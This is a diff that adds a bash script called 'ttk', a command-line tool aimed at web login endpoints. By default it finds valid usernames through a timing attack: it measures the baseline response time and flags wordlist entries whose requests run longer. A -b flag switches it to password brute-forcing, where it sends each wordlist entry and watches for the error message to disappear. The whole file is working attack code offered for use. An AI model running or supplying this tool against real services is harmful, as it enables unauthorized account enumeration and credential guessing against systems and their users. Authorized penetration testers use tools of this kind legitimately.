@@ -1,0 +1,252 @@
+#!/bin/bash
+
+############# GRAPHICS ###################
+
+graphics() {
+cat << "EOF"
+[33m
+░▀█▀░█░█░█▀▀░░░▀█▀░▀█▀░█▄█░█▀▀░░░█░█░█▀▀░█▀▀░█▀█░█▀▀░█▀▄
+░░█░░█▀█░█▀▀░░░░█░░░█░░█░█░█▀▀░░░█▀▄░█▀▀░█▀▀░█▀▀░█▀▀░█▀▄
+░░▀░░▀░▀░▀▀▀░░░░▀░░▀▀▀░▀░▀░▀▀▀░░░▀░▀░▀▀▀░▀▀▀░▀░░░▀▀▀░▀░▀
+
+ ______________________
+(@7Ragnarok7;:;:.:. .  )
+ T""""""""""""""""""""T
+ |.;....,..........;..|
+ |;;:: .  .    .      |
+ l;;;:. :   .     ..  ;
+ `;;:::.: .    .     .'
+  l;;:. ..  .     .: ;
+  `;;::.. .    .  ; .'
+   l;;:: .  .    /  ;
+    \;;:. .   .,'  /
+     `\;:.. ..'  .'
+       `\;:.. ..'
+         \;:. /
+          l; f
+          `;f'
+           ||
+           ;l.
+          ;: l
+         / ;  \
+       ,/  :   `.
+     ./' . :     `.
+    /' ,'  :       \
+   f  /  . :        i
+  ,' ;  .  :        `.
+  f ;  .   :      .  i
+ .'    :   :       . `.
+ f ,  .    ;       :  i
+ |    :  ,/`.       : |
+ |    ;,/;:. `.     . |
+ |___,/;;:. . .`._____|
+(@7Ragnarok7;:;:.:. .  )
+ """"""""""""""""""""""
+[0m
+EOF
+}
+
+
+############## USAGE INSTRUCTIONS ##################
+
+print_usage() {
+  printf "
+Usage:-
+
+./ttk -u url -d data -w wordlist 
+
+Optional flags :-
+
+-h (prints this help menu)
+-s (use this to run ttk in silent mode)
+-j (use this if the data is of json type)
+-c (use this to provide cookies if any)
+-b (use this to run ttk in bruteforcing mode)
+-e error msg (*mandatory flag if using -b*, use this to provide an error msg) 
+
+"
+exit 1
+}
+
+echo
+
+############### GETTING SHELL ARGUMENTS ################
+
+while getopts 'u:d:w:c:e:jsbh' flags; do
+  case ${flags} in
+		b) brute='True' ;;
+		c) cookies=${OPTARG} ;;
+		d) data=${OPTARG} ;;
+		e) error=${OPTARG} ;;
+		h) print_usage ;;
+		j) json='True' ;;
+		s) silent='True' ;;
+    u) url=${OPTARG} ;;
+		w) wordlist=${OPTARG} ;;
+    *) print_usage ;;
+  esac
+done
+
+if ((test -z ${url+x} || test -z ${data+x} || test -z ${wordlist+x}) || (! test -z ${brute+x} && test -z ${error+x})); then
+	echo "Required arguments not supplied!"
+	print_usage
+fi
+
+if (test -z $silent); then
+	graphics
+fi
+
+################# CHECKING IF DATA IS OF JSON TYPE OR X-WWW-FORM-URLENCODE TYPE ###############################
+
+if (! test -z $json); then
+	header='-H Content-Type:application/json'
+	params=($(echo $(echo $data | jq 'keys | .[]') | tr " " "\n" | sed 's/"//g'))
+else
+	temp=()
+	values=()
+	params=($(echo $data | tr "&" "\n"))
+	for i in ${params[@]}
+	do
+		temp+=($(echo $i | cut -d '=' -f 1))
+		values+=($(echo $i | cut -d '=' -f 2))
+	done
+	params=("${temp[@]}")
+fi
+
+len=${#params[@]}
+
+
+
+############## CHECKING FOR COOKIES ##########################
+
+if (! test -z ${cookies+x}); then
+	cookies="--cookie $cookies"
+fi
+
+############### SELECTING THE PAYLOAD PARAMETER #############
+
+if (($len >= 2)); then
+	echo "Found more than one data parameteres."
+	echo -n "Choose any one ("
+	for i in ${params[@]}
+	do
+		echo -n "$i, "
+	done
+	echo -n "): "
+	read params
+fi
+
+############# MODIFYING THE DATA #################
+
+if (! test -z $json); then
+	value=$(echo $data | jq '."'"$params"'"')
+else
+	for i in "${!temp[@]}"; do
+  	if [[ "${temp[$i]}" = "${params}" ]]; then
+    	value="${values[i]}"
+			break
+		fi
+	done
+fi
+
+modify() {
+	if (! test -z $json); then
+	newdata=${data//$value/\"$word\"}
+else
+	newdata=${data//$value/$word}
+fi
+}
+
+########## PRINTING FUNCTION ##########
+
+print() {
+	if (test -z $silent); then
+			echo "$word: $time1"s
+	fi
+}
+
+################## TESTING THE SERVER FOR AN AVG RESPONSE TIME ###############
+
+testt() {
+	if (test -z $silent); then
+		echo -e "\n Testing the target url.....\n"
+	fi
+	words=("ryu" "nina" "bow" "katt" "jean") # yes the names are a reference to BOF 2 :)
+	time=0
+	for word in ${words[@]}
+	do
+		modify
+		time1=$(curl $header $cookies -d "$newdata" -w "%{time_total}" -so /dev/null $url)
+		print
+		time=$(bc -l <<<${time}+${time1})	
+	done
+	time=$(bc -l <<<${time}/5)
+	if (test -z $silent); then
+		echo -e "\nAverage response time: $time"s
+	fi
+}
+
+############ SELECTING A THRESHOLD TIME #############
+
+threshold(){
+	time=$(bc -l <<<${time}*1.8)
+	if (test -z $silent); then
+		echo "Recommended threshold time: $time"s
+		read -p $'\x0aContinue with the recommended? (Y/n): ' choice
+		if [[ $choice == "n" || $choice == "N" ]]; then
+			read -p "Enter a new threshold value: " time
+		fi
+	fi
+}
+
+################ MAIN ########################
+
+if (test -z $brute); then
+	testt
+	threshold
+	out='-o /dev/null'
+fi
+
+main(){
+	echo
+	results=()
+	while IFS= read -r word
+	do
+		modify
+		time1=$(curl $header $cookies -d "$newdata" -w "%{time_total}" -s $out $url)
+		if (test -z $brute); then
+			print
+			if (( $(echo "$time1 > $time" | bc -l) )); then
+				if (test -z $silent); then
+					echo -e "\nProbable user found: $word\n"
+				fi
+				results+=($word)
+			fi
+		else
+			if (test -z $silent); then
+				echo $word
+			fi
+			if [[ ! $time1 == *$error* ]]; then
+				echo -e "\nPassword found: $word\n"
+				exit 1
+			fi
+		fi
+	done < "$wordlist"
+	
+	if (test -z $brute); then
+		if (! test -z "$results"); then
+			echo -en "\nThe following probable users found: ["
+			for i in ${results[@]}
+			do
+				echo -n "$i, "
+			done
+			echo -e "] \n"
+		else
+			echo -e "\nNo users found!\n"
+		fi
+	else
+		echo -e "\nPassword not found!\n"
+	fi
+}
+
+main
